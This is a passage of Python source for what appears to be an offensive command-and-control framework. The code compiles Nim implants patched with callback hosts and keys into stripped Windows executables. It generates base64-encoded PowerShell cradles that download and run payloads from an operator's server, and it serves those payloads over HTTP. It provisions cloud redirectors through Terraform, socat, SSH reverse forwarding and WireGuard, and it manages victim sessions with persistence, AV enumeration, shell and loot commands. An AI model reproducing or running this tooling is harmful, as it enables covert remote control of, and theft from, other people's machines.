            print(f'{Fore.RED}[-] implant_HTTPS.nim not found in {file_loc}')
        
        if GUI == True:
            redir_host_ip = domain
        else:
            redir_host_ip = dns_record
        with open(f'{implant_loc}/{f_name}') as f:
            patch_host = f.read().replace('URL', str(redir_host_ip.strip())) #changed to use host_ip instead of URL above - properly needs to make a func more direceted at redirs or maybe just a menu with more stuff(other ip + rerdir)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(patch_host)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            new_key = f.read().replace('AUTH_KEY', auth_key)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(new_key)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            RC_patch = f.read().replace('RCKEY', RCKey)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(RC_patch)
            f.close()
        if GUI == False:
            compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
            for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
                process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                process.wait()
            implant_loc = os.path.join(final_loc, exe_file)
            if os.path.exists(implant_loc):

                clean_up_compile_tmp(f_name)

                print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')
            else:
                output = process.stdout.read()
                print(output.decode('utf-8'))
                print(Fore.RED + '[-] An error occurred while compiling the implant')
        elif GUI == True:
            try:
                compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
                process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                process.wait()
            except Exception as e:
                clean_up_compile_tmp(f_name)
                return jsonify({'error': str(e)}), 500

            implant_loc = os.path.join(final_loc, exe_file)
            if os.path.exists(implant_loc):

                clean_up_compile_tmp(f_name)

                return send_file(implant_loc, as_attachment=True, download_name=exe_file)
            else:
                output = process.stdout.read()
                clean_up_compile_tmp(f_name)
                return jsonify({'An error occurred while compiling the implant': output.decode('utf-8')}), 500
        
        clean_up_compile_tmp(f_name)
        return jsonify({'error': 'File not found'}), 404
    else:

        if os.path.exists(file_loc):
            shutil.copy(file_loc, f_name)
            shutil.move(f_name, implant_loc)
        else:
            print(f'{Fore.RED}[-] implant_HTTP.nim not found in {file_loc}')
        
        http_host_ip = input('[*] Specify IP: ')
        URL = f'{http_host_ip}:{http_host_port}'    
        with open(f'{implant_loc}/{f_name}') as f:
            patch_host = f.read().replace('URL', str(URL.strip())) #changed to use host_ip instead of URL above - properly needs to make a func more direceted at redirs or maybe just a menu with more stuff(other ip + rerdir)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(patch_host)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            patch_id = f.read().replace('ID', str(id))
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(patch_id)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            new_key = f.read().replace('AUTH_KEY', auth_key)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(new_key)
            f.close()
        with open(f'{implant_loc}/{f_name}') as f:
            RC_patch = f.read().replace('RCKEY', RCKey)
        with open(f'{implant_loc}/{f_name}', 'w') as f:
            f.write(RC_patch)
            f.close()
        compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
        for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
            process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            process.wait()
        implant_loc = os.path.join(final_loc, exe_file)
        if os.path.exists(implant_loc):
            
            clean_up_compile_tmp(f_name)
            print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
        
        else:
            output = process.stdout.read()
            print(output.decode('utf-8'))
            clean_up_compile_tmp(f_name)
            print(Fore.RED + '[-] An error occurred while compiling the implant')
    
    
def resolve_ip(interface):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(), 0x8915,  # SIOCGIFADDR
        struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24])
    
        

def pwsh_cradle():
   
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    payload_name = []
    global check_file_loc 
    for file in os.listdir(payload_loc):
        payload_name.append(file)
        check_file_loc = os.path.expanduser(f'{cwd_payload}/Payloads/{file}')

    print(f'{Fore.LIGHTGREEN_EX}[*] Payload server available at {payload_srv_ip}:8999')
    for i in payload_name:
        if os.path.exists(check_file_loc):
            runner_file = swnamegen(2)
            runner_file = f'{runner_file}.exe'
            random_exe = (''.join(random.choices(string.ascii_lowercase, k=8))) 
            random_exe = f'{random_exe}.exe'
            payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
            runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{payload_srv_ip}:8999/{runner_file}')".encode('utf-16le')
            with open(runner_file, 'w') as f:
                f.write(f'powershell -c wget http://{payload_srv_ip}:8999/{i} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
                f.close()
                shutil.move(runner_file, payload_loc)
            b64_runner = base64.b64encode(runner_cal_unencoded)
            b64_runner = b64_runner.decode()
            print(f'{Fore.CYAN}\n[+] {i} - B64 encoded payload\n\npowershell -e {b64_runner}')
            b64_runner_decoded = base64.b64decode(b64_runner).decode()
            print(f'{Fore.CYAN}\n[+] Unencoded payload\n\n{b64_runner_decoded}')
            print('----------------------------------------------------------------------------------------------------------')
        else:
            print(f'{Fore.RED}[-] {check_file_loc} does not exist in payloads folder... Try another payload ')

        

def web_payload_server(ip=None):
    
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=payload_loc, **kwargs)

    http_handler = Handler
    http_handler.log_message = lambda *args, **kwargs: None
    server = http.server.ThreadingHTTPServer((ip, 8999), http_handler)
    
    print(f'{Fore.GREEN}[+] Payload server is running at http://{ip}:8999')
    thread = threading.Thread(target = server.serve_forever)
    thread.daemon = True
    thread.start()
    return ip
    

def redirector(LPORT):
    key_loc = os.path.expanduser('~/.ssh/id_rsa')
    if os.path.exists(key_loc):
        print(Fore.LIGHTGREEN_EX + '[+] Keypair already present...')
    else:
        print(Fore.LIGHTYELLOW_EX + '[*] Generating SSH keypair...')
        key = RSA.generate(2048)
        f = open("id_rsa", "wb")
        f.write(key.exportKey('PEM'))
        f.close()

        pubkey = key.publickey()
        f = open("id_rsa.pub", "wb")
        f.write(pubkey.exportKey('OpenSSH'))
        f.close()

        priv_key_loc = os.path.expanduser('id_rsa')
        pub_key_loc = os.path.expanduser('id_rsa.pub')
        shutil.move(priv_key_loc, key_loc)
        shutil.move(pub_key_loc, key_loc)

    old_cwd = os.getcwd()
    cwd = os.getcwd()
    terra_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform_TCP')
    redir_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/redirector_template.tf')
    script_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/script.sh')
    redir_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform_TCP/redirector.tf')
    script_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform_TCP/script.sh')
    script_name = "script.sh"
    redirector_name = "redirector.tf"
    if os.path.exists(redir_loc):
        shutil.copy(redir_loc, redir_copy_loc)
        print(Fore.LIGHTYELLOW_EX +'[*] Patching listening port...')
        with open(f'{terra_loc}/{redirector_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{redirector_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            
    if os.path.exists(script_loc):
        shutil.copy(script_loc, script_copy_loc)
        with open(f'{terra_loc}/{script_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{script_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            print(Fore.GREEN +'[+] Listening port patched\n')
    
    print(Fore.LIGHTYELLOW_EX +'[*] Provisioning and configuring redirector... This will take a couple minutes')
    os.chdir(terra_loc)
    os.system("terraform init")
    terra_cmd = ["terraform", "apply", "-auto-approve"]
    process = subprocess.Popen(terra_cmd, stdout=subprocess.PIPE)
    output = process.stdout.read()
    redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', output.decode('utf-8'))
    global re_ip_str
    re_ip_str = "".join(redir_ip)
    process.wait()

    print(Fore.LIGHTYELLOW_EX + '[*] Running socat relay trough SSH.. wait a moment.')
    subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
        shell=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False)
    print(Fore.GREEN + '[+] Socat relay configured...')
    print(Fore.LIGHTYELLOW_EX + '[*] Setting up reverse port forward on localhost')
    os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
    os.chdir(old_cwd)

def patch_var(input_var, file_loc, patch_pattern):
    with open(f'{file_loc}') as f:
        patch_var = f.read().replace(f'{patch_pattern}', input_var)
    with open(f'{file_loc}', 'w') as f:
        f.write(patch_var)
        f.close()
        print(f"{Fore.GREEN + input_var} patched into {file_loc}{Fore.RESET}\n")




def redirector_http(dns_rec=None):
    key_loc = os.path.expanduser('~/.ssh/id_rsa')
    if os.path.exists(key_loc):
        print(Fore.LIGHTGREEN_EX + '[+] Keypair already present...')
    else:
        print(Fore.LIGHTYELLOW_EX + '[*] Generating SSH keypair...')
        key = RSA.generate(2048)
        f = open("id_rsa", "wb")
        f.write(key.exportKey('PEM'))
        f.close()

        pubkey = key.publickey()
        f = open("id_rsa.pub", "wb")
        f.write(pubkey.exportKey('OpenSSH'))
        f.close()

        priv_key_loc = os.path.expanduser('id_rsa')
        pub_key_loc = os.path.expanduser('id_rsa.pub')
        shutil.move(priv_key_loc, key_loc)
        shutil.move(pub_key_loc, key_loc)


    old_cwd = os.getcwd()
    terra_loc = os.path.expanduser(f'{old_cwd[:-3]}/Terraform_HTTP')

    os.chdir(terra_loc)
    cwd = os.getcwd()
    redir_folder = f"{cwd}/redir"

    tf_var_file_loc = f"{cwd}/config_templates/variable.tf"
    caddy_loc = f"{cwd}/config_templates/Caddyfile"
    tf_http_redir_loc = f"{cwd}/config_templates/http_redir.tf"
    tf_var_file_loc_new = f"{cwd}/variable.tf"
    caddy_loc_new = f"{redir_folder}/Caddyfile"
    tf_http_redir_loc_new = f"{cwd}/http_redir.tf"
    


    
    shutil.copy(tf_var_file_loc, cwd)
    shutil.copy(caddy_loc, redir_folder)
    shutil.copy(tf_http_redir_loc, cwd)
    global dns_record

    if os.path.exists(tf_var_file_loc_new):
        if dns_rec is not None:
            dns_record = dns_rec
        else:
            dns_record = input("Enter the domain name for the redirector and implant: ")
        
        dns_record_list = dns_record.split(".")
        sub_dns_record = dns_record_list.pop(0)    
        main_dns_record = '.'.join(dns_record_list)

        patch_var(dns_record, caddy_loc_new, 'URL')
        shutil.move(caddy_loc_new, f"{redir_folder}/Caddyfile")

        patch_var(main_dns_record, tf_http_redir_loc_new, 'DOMAIN')
        
        patch_var(sub_dns_record, tf_http_redir_loc_new, 'SUB')

        # Generate the private key and write it to a file
        private_key = subprocess.run(["wg", "genkey"], capture_output=True, text=True).stdout.strip()
        open("keys/server-privatekey", "w").write(private_key)

        public_key = subprocess.run(["wg", "pubkey"], capture_output=True, text=True, input=private_key).stdout.strip()
        open("keys/server-publickey", "w").write(public_key)


        client_private_key = subprocess.run(["wg", "genkey"], capture_output=True, text=True).stdout.strip()
        open("keys/client-privatekey", "w").write(client_private_key)

        client_public_key = subprocess.run(["wg", "pubkey"], capture_output=True, text=True, input=client_private_key).stdout.strip()
        open("keys/client-publickey", "w").write(client_public_key)


        patch_var(private_key, tf_var_file_loc_new, 'SERVER-PRIVATE-KEY')


        patch_var(client_public_key, tf_var_file_loc_new, 'CLIENT-PUB-KEY')

        

        os.system("terraform init")
        terra_apply = ["terraform", "apply", "-auto-approve"]
        spinner.start()
        result = subprocess.run(terra_apply, text=True, capture_output=True)
        if result.returncode == 0:
            spinner.stop()
            print(result.stdout)
        else:
            print(result.stderr)
        redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', result.stdout)
        re_ip_str = "".join(redir_ip)

        config = textwrap.dedent(
            f"""\
            [Interface]
            PrivateKey = {client_private_key}
            Address = 192.168.255.2/24
            [Peer]
            PublicKey = {public_key}
            AllowedIPs = 0.0.0.0/0
            Endpoint = {re_ip_str}:51820
            PersistentKeepalive = 25"""
        )
    print(config)

    with open("/etc/wireguard/wg0.conf", "w") as f:
        f.write(config)
        f.close()
    print("Config written to '/etc/wireguard/wg0.conf'")
    print("Starting the WG tunnel to the redir. . .")


    start_wg = subprocess.run(['wg-quick', 'up', 'wg0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if start_wg.returncode == 0:
        print("Tunnel started")
    else:
        print("Tunnel failed to start")
    
    connectivity_check = subprocess.run(['ping', '-c', '4', re_ip_str], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if connectivity_check.returncode == 0:
        print("Looks like connection is succesfull")
    else:
        print("Ping test failed - cannot reach the VPS")
    os.chdir(old_cwd)


def CSharpToNimByteArray(inputfile, folder=False):
    global outfile
    try:
        if folder:
            files = os.listdir(inputfile)
            for file in files:
                print(f"{Fore.LIGHTYELLOW_EX}[*] Converting {file}")
                outfile = file + "NimByteArray.txt"
        
                with open(file, "rb") as f:
                    hex_data = f.read().hex()
                    hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                    hex_string = "0x" + hex_string
                    with open(outfile, "w", encoding="utf-8") as out:
                        out.write(hex_string)
        
            print(Fore.GREEN + "[*] Results Written to the same folder")
        else:
            
            cwd_payload = os.getcwd()
            inputfile_path = os.path.expanduser(f'{cwd_payload}/Payloads')
            print(f"Converting {inputfile}")
            outfile = inputfile + "NimByteArray.txt"
            
            with open(f'{inputfile_path}/{inputfile}', "rb") as f:
                hex_data = f.read().hex()
                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                hex_string = "0x" + hex_string
                with open(outfile, "w", encoding="utf-8") as out:
                    out.write(hex_string)
            
            print(f"{Fore.GREEN}[*] Result Written to {outfile}")


        # dos2unix conversion
        with open(outfile, "r") as f:
            content = f.read()
            with open(outfile, "w") as out:
                out.write(content.replace("\r\n", "\n"))
    except:
        print(f"{Fore.RED}[-] File not found")
        pass

class MyCompleter(object):  

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  
            if text: 
                self.matches = [s for s in self.options 
                                    if s and s.startswith(text)]
            else: 
                self.matches = self.options[:]

       
        try: 
            return self.matches[state]
        except IndexError:
            return None
    
    def add_keyword(self, keyword):
        self.options.append(keyword)
        self.options = sorted(self.options)

def payload_list():
    cwd_payload = os.getcwd()
    formatted_files = ''
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    print(f'{Fore.LIGHTYELLOW_EX}[*] Available payloads: ')
    for file in os.listdir(payload_loc):
        print(f'{Fore.CYAN}>> {file}')
        formatted_files += f'>> {file}\n'
        if file not in keywords:
            completer.add_keyword(file)
    return formatted_files

def payload_keyword_add():
    global keywords
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    for file in os.listdir(payload_loc):
        if file not in keywords:
            completer.add_keyword(file)
            keywords.append(file)

def exit_handler():
    try:
        cwd = os.getcwd()
        print(Fore.LIGHTYELLOW_EX + '[*] Destroying redirector infrastructure...')
        terra_loc = os.path.expanduser(f'{cwd.strip("C2")}/Terraform_TCP')
        os.chdir(terra_loc)
        os.system("terraform destroy -auto-approve")

    
        print(Fore.LIGHTYELLOW_EX + '[*] Cleaning up files...')
        os.remove("script.sh")
        os.remove("redirector.tf")
        print(Fore.GREEN + '[+] Files succesfully cleaned')
        
    except:
        terra_loc = os.path.expanduser(f'{cwd.strip("C2")}/Terraform_HTTP')
        os.chdir(terra_loc)
        os.system("wg-quick down wg0")
        os.system("terraform destroy -auto-approve")
        
        try:
            print(Fore.LIGHTYELLOW_EX + '[*] Cleaning up files...')
            os.remove("variable.tf")
            os.remove("http_redir.tf")
            print(Fore.GREEN + '[+] Files succesfully cleaned')
        except:
            print(Fore.RED + '[-] Files not found...')
    else:
        print(Fore.RED + '[-] An error occurred while cleaning up files')


if __name__ == '__main__':
    global keywords
    keywords = ["listener -g","HTTP", "TCP", "threads" ,"nimplant -g", "callbacks","download","use ", "pwsh_cradle", "kill ", "exit","sleep","help","payloads", "background", "persist", "GetAV", "pwsh", "execute-ASM", "ls", "cd", "pwd", "shell"]
    completer = MyCompleter(keywords)
    readline.set_completer(completer.complete)
    readline.parse_and_bind('tab: complete')
    for kw in keywords:
        readline.add_history(kw)
    colorama.init(autoreset=True)
    targets = [] #store each connection
    global listener_count
    listener_count = 0
    banner()
    internal_interface()
    
    kill_flag = 0
    global host_ip
    global host_port
    global listen_type
    global target_id
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if not os.path.exists('Generated_Implants'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Generated Implants Directory...")
        os.mkdir('Generated_Implants')
    if not os.path.exists('Payloads'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Payloads Directory...")
        os.mkdir('Payloads')
    if not os.path.exists('Loot'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Loot Directory...")
        os.mkdir('Loot')
    
    payload_keyword_add()
    length_gen = secrets.SystemRandom()
    key_length = length_gen.randint(12,33)
    auth_key = (''.join(secrets.token_urlsafe(key_length)))
    
    RCkey_length = length_gen.randint(12,18)
    RCKey = (''.join(secrets.token_urlsafe(key_length)))
    print(f'{Fore.CYAN}[+] AuthKey for this session is {auth_key}')


    while True:
        try:
            command = input(Fore.LIGHTYELLOW_EX +'Enter command#>' + Fore.RESET)
            if command == 'help':
                help()
            elif command == 'threads':
                for thread in threading.enumerate(): 
                    print(thread.name)
            elif command == 'help background':
                background_help()
            elif command == 'help execute-ASM':
                execute_ASM_help()
            elif command == 'help payloads':
                payloads_help()
            elif command == 'help listener' or command == 'help listener -g':
                listener_help()
            elif command == 'help nimplant'or command == 'help nimplant -g':
                nimplant_help()
            elif command == 'help pwsh_cradle':
                pwsh_cradle_help()
            elif command == 'help GetAV':
                GetAV_help()
            elif command == 'help download':
                download_help()
            elif command == 'help use':
                use_help()
            elif command == 'help kill':
                kill_help()
            elif command == 'help callbacks':
                callbacks_help()
            elif command == 'help pwsh':
                pwsh_help()
            elif command == 'help shell':
                shell_help()
            elif command == 'help cd':
                cd_help()
            elif command == 'help ls':
                ls_help()
            elif command == 'help pwd':
                pwd_help()
            elif command == 'help exit':
                exit_help()
            elif command == 'help sleep':
                sleep_help()
            elif command == 'help persist':
                persist_help()
            
            elif command == 'payloads':
                payload_list()
            if command == 'listener -g TCP':
                listen_type = 'TCP'
                try:
                    print(Fore.CYAN + '[*] 1. Interface')
                    print(Fore.CYAN + '[*] 2. IP-Address')
                    print(Fore.CYAN + '[*] 3. Listener with redirector\n ')
                    listen_choice = (input(Fore.LIGHTYELLOW_EX + '[*] Choose an option: ' + Fore.RESET))
                except (OSError, ValueError, TypeError):
                    print(Fore.RED + '[-] No such option... Please try again')
                
                if listen_choice == '1':
                    while True:
                        try:
                            host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
                            host_port = int(input(Fore.CYAN + '[#] Enter listening port: '+ Fore.RESET))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print(Fore.RED + '[-] No such Interface or port... Please try again')
                elif listen_choice == 2:
                    
                    while True:
                        try:
                            host_ip = input('[#] Enter the IP to listen on: ')
                            host_port = int(input('[#] Enter listening port: '))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print('[-] No such IP or port... Please try again')
                elif listen_choice == '3':
                    host_ip = resolve_ip("lo")
                    host_port = int(input('[#] Enter listening port: '))
                    redirector(host_port)
                
                listener_handler()
                listener_count +=1
                global payload_srv_ip
                payload_srv_ip = web_payload_server(host_ip)
            elif command == 'listener -g HTTP':
                listen_type = 'HTTP'
                print(Fore.CYAN + '[*] 1. Interface')
                print(Fore.CYAN + '[*] 2. Listener with HTTPS redirector\n ')
                listen_choice = (input(Fore.LIGHTYELLOW_EX + '[*] Choose an option: ' + Fore.RESET))
                if listen_choice == '1':
                    http_host_port = int(input(Fore.CYAN + '[#] Enter listening port: ' + Fore.RESET))
                    httpListenerHandler()
                    listener_count +=1
                    payload_srv_ip = web_payload_server(http_host_ip)
                elif listen_choice == '2':
                    redirector_http()
                    HttpRedirectorListenerHandler()
                    listener_count +=1

            elif command == 'nimplant -g TCP':
                if listener_count > 0:
                    nimplant()
                else:
                    print(f'{Fore.RED}[-] Cannot compile payload without active listener{Fore.RESET}')
            elif command == 'nimplant -g HTTP':
                if listener_count > 0:
                    nimplant_HTTP()
                else:
                    print(f'{Fore.RED}[-] Cannot compile payload without active listener{Fore.RESET}')
            if command == 'pwsh_cradle':
                if listener_count > 0:
                    pwsh_cradle()
                else:
                    print(f'{Fore.RED}[-] Cannot create pwsh_cradle without active listener{Fore.RESET}')

            if command.split(" ")[0] == 'kill':
                if listen_type == 'TCP':
                    try:
                        num = int(command.split(" ")[1])
                        target_id = (targets[num][0])
                        if targets[num][8] == 'Active':
                            kill_signal(target_id, 'exit')
                            targets[num][8] = 'Dead'
                            print(f'[-] Session {num} terminated')
                        else:
                            print('[-] Cannot interact with a dead session')
                    except(IndexError, ValueError, NameError):
                        try:
                            print(f'Session {num} does not exist')
                        except NameError:
                            print('[-] no active sessions to kill')
                else:
                    try:
                        num = int(command.split(" ")[1])
                        target_id = (targets[num][0])
                        if targets[num][8] == 'Active':
                            kill_http(target_id, 'exit')
                            targets[num][8] = 'Dead'
                            print(f'{Fore.RED} [-] Session {num} terminated {Fore.RESET}')
                        else:
                            print('[-] Cannot interact with a dead session')
                    except(IndexError, ValueError, NameError):
                        try:
                            print(f'Session {num} does not exist')
                        except NameError:
                            print('[-] no active sessions to kill')
            
            if command.split(" ")[0] == 'callbacks':
                session_counter = 0
                

                session_table = PrettyTable()
                session_table.field_names = [Fore.CYAN +'ID','Username', 'Admin' ,'Status' ,'Target','Operating System','AMSI','Callback Time']
                session_table.padding_width = 3
                for target in targets:
                    if target[0] == 'HTTP':
                        session_table.add_row([str(session_counter) + " - " + target[1], target[4],target[5],target[8], target[2], target[6],target[9],target[3]])
                    else:
                        session_table.add_row([session_counter, target[4],target[5],target[8], target[2], target[6],target[9],target[3]])
                    session_counter += 1
                print(session_table)

            


            if command.split(" ")[0] == 'use':
                try:
                    num = int(command.split(" ")[1])
                    listen_type_use = targets[num][0]

                    if listen_type_use == 'TCP':
                        print("RUNNING TCP interaction mode")
                        num = int(command.split(" ")[1])
                        target_id = (targets[num])[1]
                        if (targets[num])[8] == 'Active':
                            target_comm(target_id, targets, num)
                        else: 
                            print(Fore.RED +'[-] Can not interact with Dead implant')
                    elif listen_type_use == 'HTTP':
                        print(Fore.LIGHTYELLOW_EX + "RUNNING HTTP interaction mode" + Fore.RESET)
                        print(Fore.LIGHTYELLOW_EX + "Deafult callback interval: 5 seconds" + Fore.RESET)
                        num = int(command.split(" ")[1])
                        target_id = (targets[num])[1]
                        if (targets[num])[8] == 'Active':
                            http_target_comm(target_id, targets, num, task_queue)
                        else: 
                            print(Fore.RED +'[-] Can not interact with Dead implant')
                except (IndexError, TypeError):
                    print(f'{Fore.RED}[-] Session {num } does not exist' )
                    
            if command == 'exit':
                quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
                if quit_message == 'y':
                    for target in targets:
                        if target[8] == 'Dead':
                            pass
                        else:
                            if listen_type == 'TCP':
                                comm_out(target[0], 'exit')
                            else:
                                if target_id not in task_queue:
                                    task_queue[target_id] = []
                                task_queue[target_id].append(command)
                    kill_flag = 1
                    if listener_count > 0:
                        sock.close()
                    break
                else:
                    continue
        except KeyboardInterrupt:
            quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
            if quit_message == 'y':
                for target in targets:
                    if target[8] == 'Dead':
                        pass
                    else:
                        if listen_type == 'TCP':
                            comm_out(target[1], 'exit')
                        else:
                            if target_id not in task_queue:
                                task_queue[target_id] = []
                            task_queue[target_id].append(command)
                                
                            
                kill_flag = 1
                if listener_count > 0:
                    sock.close()
                break
            else:
                continue
atexit.register(exit_handler)